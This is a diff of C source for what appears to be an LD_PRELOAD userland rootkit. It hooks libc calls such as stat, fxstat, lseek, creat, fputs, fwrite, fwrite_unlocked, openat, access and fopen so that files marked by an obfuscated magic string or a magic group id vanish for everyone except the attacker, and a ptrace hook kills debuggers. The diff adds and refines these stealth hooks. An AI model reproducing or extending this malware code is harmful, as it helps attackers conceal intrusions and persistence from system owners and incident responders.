@@ -65,6 +65,7 @@ ssize_t (*old_pread64)(int fd, void *buf, size_t count, off64_t offset);
 int (*old_creat)(const char *path, mode_t mode);
 int (*old_fputs)(const char *s, FILE *stream);
 size_t (*old_fwrite)(const void *ptr, size_t size, size_t nmemb, FILE *stream);
+size_t (*old_fwrite_unlocked)(const void *ptr, size_t size, size_t n, FILE *stream);
 ssize_t (*old_pwrite)(int fd, const void *buf, size_t count, off_t offset); 
 
 //file naming functions 
@@ -153,25 +154,6 @@ long int ptrace(enum __ptrace_request request, ...)
 	exit(-1);
 }
 
-off_t lseek(int fildes, off_t offset, int whence)
-{ 
-	HOOK(lseek);
-	HOOK(__fxstat); 
-	#ifdef DEBUG 
-	printf("[!] lseek hooked\n");
-	#endif
-
-	if (owned()) return old_lseek(fildes, offset, whence); 
-	struct stat filestat; 
-	old___fxstat(_STAT_VER, fildes, &filestat); 
-	if (filestat.st_gid == MAGICGID)
-	{ 
-		errno = EBADF; 
-		return -1;
-	}
-	return old_lseek(fildes, offset, whence);
-}
-
 int stat(const char *path, struct stat *buf)
 {
 	HOOK(stat);
@@ -226,7 +208,6 @@ int __xstat(int ver, const char *path, struct stat *buf)
 	if (owned()) return old___xstat(ver, path, buf);
 	char *magic = strdup(MAGIC); xor(magic);
 	struct stat filestat; 
-	memset(&filestat, 0x00, sizeof(filestat)); 
 	old___xstat(_STAT_VER, path, &filestat);
 	if ((strstr(path, magic) != NULL ) || (filestat.st_gid == MAGICGID))
 	{
@@ -269,26 +250,19 @@ int __fxstat(int ver, int fildes, struct stat *buf)
 	#ifdef DEBUG
 	printf("[!] fxstat hooked\n"); 
 	#endif 
-
-	if(!libc)
+	
+	if (!libc)
 		libc = dlopen(LIBC, RTLD_LAZY); 
 	if (old___fxstat == NULL)
-		old___fxstat = dlsym(libc, "__fxstat");
-	if (owned())
-	{ 
-		return old___fxstat(ver, fildes, buf); 
-	}
-	char *magic = strdup(MAGIC); xor(magic); 
+		old___fxstat = dlsym(LIBC, "__fxstat"); 
 	struct stat filestat; 
 	memset(&filestat, 0x00, sizeof(filestat));
 	old___fxstat(_STAT_VER, fildes, &filestat); 
 	if (filestat.st_gid == MAGICGID)
 	{ 
-		CLEAN(magic); 
 		errno = ENOENT; 
 		return -1; 
 	}
-	CLEAN(magic); 
 	return old___fxstat(ver, fildes, buf);
 }
 
@@ -431,6 +405,25 @@ int __fxstat64(int ver, int fildes, struct stat64 *buf)
 	return old___fxstat64(ver, fildes, buf);
 }
 
+off_t lseek(int fildes, off_t offset, int whence)
+{ 
+	HOOK(lseek);
+	HOOK(__fxstat); 
+	#ifdef DEBUG 
+	printf("[!] lseek hooked\n");
+	#endif
+
+	if (owned()) return old_lseek(fildes, offset, whence); 
+	struct stat filestat; 
+	old___fxstat(_STAT_VER, fildes, &filestat); 
+	if (filestat.st_gid == MAGICGID)
+	{ 
+		errno = EBADF; 
+		return -1;
+	}
+	return old_lseek(fildes, offset, whence);
+}
+
 int link(const char *oldpath, const char *newpath)
 { 
 	HOOK(link); 
@@ -522,13 +515,16 @@ int symlink(const char *path1, const char *path2)
 int creat(const char *path, mode_t mode)
 { 
 	HOOK(creat);
+	HOOK(__lxstat);
 	#ifdef DEBUG 
 	printf("[!] creat hooked"); 
 	#endif 
 
 	if (owned()) return old_creat(path, mode); 
 	char *magic = strdup(MAGIC); xor(magic); 
-	if (strstr(path, magic))
+	struct stat filestat; 
+	old___lxstat(_STAT_VER, path, &filestat);
+	if ((strstr(path, magic) != NULL) || (filestat.st_gid==MAGICGID))
 	{ 
 		CLEAN(magic);
 		errno = ENOENT; 
@@ -541,13 +537,17 @@ int creat(const char *path, mode_t mode)
 int fputs(const char *s, FILE *stream)
 { 
 	HOOK(fputs); 
+	HOOK(__fxstat);
 	#ifdef DEBUG 
 	printf("[!] fputs hooked\n"); 
 	#endif 
 
 	if (owned()) return old_fputs(s, stream); 
 	char *magic = strdup(MAGIC); xor(magic); 
-	if (strstr(s, magic))
+	struct stat filestat; 
+	int fp = fileno(stream); 
+	old___fxstat(_STAT_VER, fp, &filestat);
+	if ((strstr(s, magic) != NULL) || (filestat.st_gid == MAGICGID))
 	{ 
 		CLEAN(magic); 
 		errno = ENOENT; 
@@ -560,7 +560,7 @@ int fputs(const char *s, FILE *stream)
 size_t fwrite(const void *ptr, size_t size, size_t nmemb, FILE *stream)
 { 
 	HOOK(fwrite); 
-	HOOK(__fxstat); 
+	HOOK(__fxstat);
 	#ifdef DEBUG 
 	printf("[!] fwrite hooked\n"); 
 	#endif 
@@ -574,6 +574,25 @@ size_t fwrite(const void *ptr, size_t size, size_t nmemb, FILE *stream)
 		return 0; 
 	} 
 	return old_fwrite(ptr, size, nmemb, stream);
+}
+
+size_t fwrite_unlocked(const void *ptr, size_t size, size_t n, FILE *stream)
+{ 
+	HOOK(fwrite_unlocked); 
+	HOOK(__fxstat); 
+	#ifdef DEBUG 
+	printf("[!] fwrite_unlocked hooked\n"); 
+	#endif 
+
+	if (owned()) return old_fwrite_unlocked(ptr, size, n, stream); 
+	struct stat filestat; 
+	int fd = fileno(stream); 
+	old___fxstat(_STAT_VER, fd, &filestat); 
+	if (filestat.st_gid == MAGICGID)
+	{ 
+		return 0; 
+	} 
+	return old_fwrite_unlocked(ptr, size, n, stream); 
 }
 
 size_t fread(void *ptr, size_t size, size_t nmemb, FILE *stream)
@@ -886,7 +905,10 @@ DIR *opendir64(const char *name)
 	CLEAN(magic); 
 	return old_opendir64(name); 
 } 
-
+/* WARNING:
+ * Since I originally hooked the glibc wrappers and not the actual syscalls, everything after oflags is lost when I return the original function. This creates some weird file behavior. I will fix this in a future commit.
+*/
+/*
 int open(const char *file, int oflag, ...)
 { 
 	HOOK(open); 
@@ -895,11 +917,13 @@ int open(const char *file, int oflag, ...)
 	printf("[!] open hooked\n"); 
 	#endif 
 	
+	mode_t mode;
 	if (owned()) return old_open(file, oflag); 
 	char *magic = strdup(MAGIC); xor(magic); 
 	struct stat filestat; 
+	memset(&filestat, 0x0, sizeof(filestat));
 	old___xstat(_STAT_VER, file, &filestat); 
-	if ((strstr(file, magic) != NULL) || filestat.st_gid == MAGICGID)
+	if ((strstr(file, magic) != NULL) || (filestat.st_gid == MAGICGID))
 	{ 
 		CLEAN(magic);
 		errno = ENOENT; 
@@ -908,7 +932,9 @@ int open(const char *file, int oflag, ...)
 	CLEAN(magic);
 	return old_open(file, oflag);
 }
+*/
 
+/*
 int open64(const char *file, int oflag, ...)
 { 
 	HOOK(open64); 
@@ -920,8 +946,9 @@ int open64(const char *file, int oflag, ...)
 	if (owned()) return old_open64(file, oflag); 
 	char *magic = strdup(MAGIC); xor(magic); 
 	struct stat64 filestat; 
+	memset(&filestat, 0x0, sizeof(filestat));
 	old___xstat64(_STAT_VER, file, &filestat); 
-	if ((strstr(file, magic) != NULL) || filestat.st_gid == MAGICGID)
+	if ((strstr(file, magic) != NULL) || (filestat.st_gid == MAGICGID))
 	{ 
 		CLEAN(magic); 
 		errno = ENOENT; 
@@ -930,6 +957,7 @@ int open64(const char *file, int oflag, ...)
 	CLEAN(magic); 
 	return old_open64(file, oflag); 
 }
+*/
 
 int openat(int fd, const char *path, int oflag, ...)
 { 
@@ -942,8 +970,9 @@ int openat(int fd, const char *path, int oflag, ...)
 	if (owned()) return old_openat(fd, path, oflag); 
 	char *magic = strdup(MAGIC); xor(magic); 
 	struct stat filestat; 
+	memset(&filestat, 0x0, sizeof(filestat));
 	old___xstat(_STAT_VER, path, &filestat); 
-	if ((strstr(path, magic) != NULL) || filestat.st_gid == MAGICGID)
+	if ((strstr(path, magic) != NULL) || (filestat.st_gid == MAGICGID))
 	{
 		CLEAN(magic);
 		errno = ENOENT; 
@@ -1004,8 +1033,8 @@ int access(const char *pathname, int mode)
 	if (owned()) return old_access(pathname, mode); 
 	char *magic = strdup(MAGIC); xor(magic); 
 	struct stat filestat; 
-	old___xstat(_STAT_VER, pathname, &filestat); 
-	if ((strstr(pathname, magic) != NULL) || filestat.st_gid == MAGICGID)
+	old___xstat(_STAT_VER, pathname, &filestat);
+	if ((strstr(pathname, magic) != NULL) || (filestat.st_gid == MAGICGID))
 	{ 
 		CLEAN(magic);
 		errno = ENOENT; 
@@ -1014,6 +1043,7 @@ int access(const char *pathname, int mode)
 	CLEAN(magic);
 	return old_access(pathname, mode);
 }
+
 FILE *fopen(const char *pathname, const char *mode)
 { 
 	HOOK(fopen);
@@ -1024,9 +1054,9 @@ FILE *fopen(const char *pathname, const char *mode)
 
 	if (owned()) return old_fopen(pathname, mode);
 	char *magic = strdup(MAGIC); xor(magic); 
-	struct stat filestat; 
-	old___xstat(_STAT_VER, pathname, &filestat); 
-	if ((strstr(pathname, magic) != NULL) || filestat.st_gid == MAGICGID)
+	struct stat filestat;
+	old___xstat(_STAT_VER, pathname, &filestat); 	
+	if ((strstr(pathname, magic) != NULL) || (filestat.st_gid == MAGICGID))
 	{
 		CLEAN(magic);
 		errno = ENOENT;
